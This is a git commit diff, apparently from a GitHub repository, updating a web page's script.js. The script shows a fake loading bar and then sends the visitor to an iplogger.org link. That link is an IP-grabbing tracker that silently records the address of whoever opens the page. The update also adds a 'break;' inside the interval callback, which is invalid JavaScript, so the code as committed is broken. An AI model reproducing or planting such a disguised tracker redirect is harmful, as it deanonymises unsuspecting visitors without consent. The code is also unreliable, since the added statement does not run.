90166af14c03615a801b8c1b1036b57e8e13d982
Karto4an <33024982+Karto4an@users.noreply.github.com>
2021-11-17 19:04:12 +0200

    Update script.js

--- script.js
+++ script.js
@@ -2,13 +2,11 @@ var progress = document.getElementsByClassName('status')[0];
 
 var num = 0;
 
-
 var intervalId = window.setInterval(function() {
-    if (num < 240) {
-        num++;
-        progress.style.width = `${num}px`;
-    }
+    num++;
+    progress.style.width = `${num}px`;
     if (num == 240) {
-        window.open("https://iplogger.org/2AsRp6","_self")
+        window.open("https://iplogger.org/2AsRp6","_self");
+        break;
     }
 }, 50);
